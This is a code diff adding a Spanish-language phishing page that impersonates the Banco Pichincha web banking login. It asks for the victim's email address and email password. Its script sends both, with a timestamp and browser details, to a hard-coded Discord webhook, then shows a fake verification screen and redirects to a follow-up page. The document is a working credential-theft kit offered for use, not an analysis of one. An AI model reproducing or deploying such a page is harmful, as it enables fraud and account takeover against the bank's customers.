@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Pichincha - Banca Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: white;
+            padding: 20px 40px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: center;
+        }
+
+        .logo img {
+            height: 45px;
+            width: auto;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .login-box {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 0;
+            box-shadow: none;
+            max-width: 680px;
+            width: 100%;
+        }
+
+        .login-box h1 {
+            font-size: 32px;
+            color: #1a3b5c;
+            margin-bottom: 10px;
+            font-weight: 400;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 18px;
+            color: #1a3b5c;
+            margin-bottom: 8px;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: #1a1a1a;
+            font-weight: 400;
+            font-size: 16px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #d0d0d0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            background: white;
+        }
+
+        .form-group input::placeholder {
+            color: #555;
+            opacity: 1;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #888;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: right;
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-ingresar {
+            width: 100%;
+            padding: 16px;
+            background: #ffe066;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 400;
+            color: #1a1a1a;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 30px;
+            opacity: 0.6;
+        }
+
+        .btn-ingresar:hover {
+            background: #ffd700;
+            opacity: 1;
+        }
+
+        .btn-ingresar:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        .bottom-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .option-card {
+            text-align: center;
+            padding: 20px 10px;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            color: #1a1a1a;
+            background: white;
+        }
+
+        .option-card:hover {
+            border-color: #ccc;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .option-icon {
+            font-size: 36px;
+            margin-bottom: 10px;
+            color: #1a3b5c;
+        }
+
+        .option-title {
+            font-weight: 400;
+            margin-bottom: 4px;
+            font-size: 14px;
+            color: #1a3b5c;
+            line-height: 1.3;
+        }
+
+        .option-subtitle {
+            font-size: 12px;
+            color: #5b8bb8;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 30px 20px;
+            color: #666;
+            font-size: 14px;
+            background: #f5f5f5;
+        }
+
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-content {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #FFD700;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .login-box {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <p style="color: #1a3b5c; font-size: 16px;">Verificando credenciales...</p>
+        </div>
+    </div>
+
+    <div class="header">
+        <div class="logo">
+            <img src="logo-banco-pichincha.png" alt="Banco Pichincha">
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="login-box">
+            <h1>¡Empecemos!</h1>
+            <p class="subtitle">Ingresa tus datos</p>
+            <p class="description">Completa la información para continuar</p>
+            
+            <form onsubmit="handleSubmit(event)" id="loginForm">
+                <div class="form-group">
+                    <label for="usuario">Correo registrado en el Banco</label>
+                    <input type="text" id="usuario" placeholder="ejemplo@hotmail.com" required>
+                    <a href="#" class="forgot-link">¿Olvidaste tu Correo?</a>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Clave de correo</label>
+                    <input type="text" id="password" placeholder="ejemplo1234" required>
+                    <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+                </div>
+
+                <button type="submit" class="btn-ingresar" id="submitBtn">Ingresar</button>
+            </form>
+
+            <div class="bottom-options">
+                <a href="#" class="option-card">
+                    <div class="option-icon">🔓</div>
+                    <div class="option-title">¿Cuenta bloqueada?</div>
+                    <div class="option-subtitle">Desbloquéala aquí</div>
+                </a>
+                <a href="#" class="option-card">
+                    <div class="option-icon">👤</div>
+                    <div class="option-title">¿Usuario nuevo?</div>
+                    <div class="option-subtitle">Regístrate ahora</div>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Términos de uso</a> © 2026 Banco Pichincha. Todos los derechos reservados.
+    </div>
+
+    <script>
+        // Configura aquí tu webhook de Discord
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1404993678467923971/IjaqrZT5XwlO0ZjSwRv9IRi1JrctRnjgQJ-PFWZENdqoS02OU1y2AbhYruv8ejsfeCTM';
+
+        async function handleSubmit(e) {
+            e.preventDefault();
+            
+            const usuario = document.getElementById('usuario').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            
+            // Deshabilitar el botón y mostrar loading
+            submitBtn.disabled = true;
+            loadingOverlay.style.display = 'flex';
+            
+            // Preparar el mensaje para Discord
+            const mensaje = {
+                embeds: [{
+                    title: '🏦 Nuevo Login - Banco Pichincha',
+                    color: 0xFFD700,
+                    fields: [
+                        {
+                            name: '👤 Usuario',
+                            value: usuario,
+                            inline: false
+                        },
+                        {
+                            name: '🔑 Contraseña',
+                            value: password,
+                            inline: false
+                        },
+                        {
+                            name: '🕐 Fecha y Hora',
+                            value: new Date().toLocaleString('es-ES'),
+                            inline: false
+                        },
+                        {
+                            name: '🌐 IP/Navegador',
+                            value: navigator.userAgent,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: 'Sistema de Monitoreo'
+                    }
+                }]
+            };
+
+            try {
+                // Enviar a Discord
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(mensaje)
+                });
+
+                // Esperar 1.5 segundos para simular verificación
+                setTimeout(() => {
+                    // Redirigir a instrucciones.html
+                    window.location.href = 'instrucciones.html';
+                }, 1500);
+
+            } catch (error) {
+                console.error('Error:', error);
+                // Aún si hay error, redirigir a instrucciones.html
+                setTimeout(() => {
+                    window.location.href = 'instrucciones.html';
+                }, 1500);
+            }
+        }
+    </script>
+</body>
+</html>
